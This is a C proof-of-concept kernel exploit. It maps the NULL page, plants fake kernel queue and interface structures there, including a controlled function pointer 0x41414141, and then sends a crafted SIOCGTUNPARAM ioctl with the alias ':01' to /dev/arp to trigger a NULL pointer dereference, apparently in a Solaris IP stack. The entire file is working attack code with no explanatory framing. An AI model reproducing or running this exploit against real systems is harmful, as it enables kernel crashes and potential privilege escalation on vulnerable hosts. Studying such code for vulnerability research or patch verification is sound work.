#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/syscall.h>
#include <sys/sockio.h>
#include <net/if.h>
#include <sys/mman.h>

////////////////////////////////////////////////
// Map the zero page and fill it with the
// necessary data.
int
map_null_page (void)
{
	void *	mem = (void *)-1;

	// map the zero page
	mem = mmap (NULL, PAGESIZE, PROT_EXEC|PROT_READ|PROT_WRITE, 
				MAP_FIXED|MAP_PRIVATE|MAP_ANON, -1, 0);

	if (mem != NULL) {
		printf ("failed\n");
		fflush (0);
		perror ("[-] ERROR: mmap");
		return 1;
	} 
  
	// fill the zero page with zeros
	memset (mem, 0x00, PAGESIZE);

	////////////////////////////////////////////////
	// zero page data

	// qi->qi_putp
	*(unsigned long long *)0x00 = 0x0000000041414141;

	// ipif->ipif_ill
	*(unsigned long long *)0x08 = 0x0000000000000010;

	// start of ill struct (ill->ill_ptr)
	*(unsigned long long *)0x10 = 0x0000000000000000;

	// ill->rq
	*(unsigned long long *)0x18 = 0x0000000000000000;

	// ill->wq (sets address for qp struct)
	*(unsigned long long *)0x20 = 0x0000000000000028;

	// start of qp struct (qp->q_info)
	*(unsigned long long *)0x28 = 0x0000000000000000;

	// qp->q_first
	*(unsigned long long *)0x30 = 0x0000000000000000;

	// qp->q_last
	*(unsigned long long *)0x38 = 0x0000000000000000;

	// qp->q_next (points to the start of qp struct)
	*(unsigned long long *)0x40 = 0x0000000000000028;

	// qp->q_syncq
	*(unsigned long long *)0xa0 = 0x00000000000007d0;

	return 0;
 }

void
status (void)
{
	unsigned long long	i = 0;

	printf ("[+] PAGESIZE: %d\n", (int)PAGESIZE);
	printf ("[+] Zero page data:\n");

	for (i = 0; i <= 0x40; i += 0x8)
		printf ("... 0x%02x: 0x%016llx\n", i, *(unsigned long long*)i);

	printf ("... 0xa0: 0x%016llx\n", *(unsigned long long*)0xa0);

	printf ("[+] The bug will be triggered in 2 seconds..\n");

	fflush (0);
}

int
main (void)
{
	int		fd  = 0;
	char	data[32];

	////////////////////////////////////////////////
	// Opening the '/dev/arp' device 
	printf ("[+] Opening '/dev/arp' device .. ");

	fd = open ("/dev/arp", O_RDWR);

	if (fd < 0) {
		printf ("failed\n");
		fflush (0);
		perror ("[-] ERROR: open");
		return 1;
	}

	printf ("OK\n");

	////////////////////////////////////////////////
	// Map the zero page
	printf ("[+] Trying to map zero page .. ");

	if (map_null_page () == 1) {
		return 1;
	}

	printf ("OK\n");

	////////////////////////////////////////////////
	// Status messages   
	status ();
	sleep (2);
  
	////////////////////////////////////////////////
	// IOCTL request data (interface name with invalid alias ':01')
	data[0] = 0x3a; // colon
	data[1] = 0x30; // ASCII zero
	data[2] = 0x31; // the digit '1'
	data[3] = 0x00; // NULL termination
  
	////////////////////////////////////////////////
	// IOCTL request
	syscall (SYS_ioctl, fd, SIOCGTUNPARAM, data);

	printf ("[-] ERROR: triggering the NULL ptr deref failed\n");
	close (fd);

	return 0;
}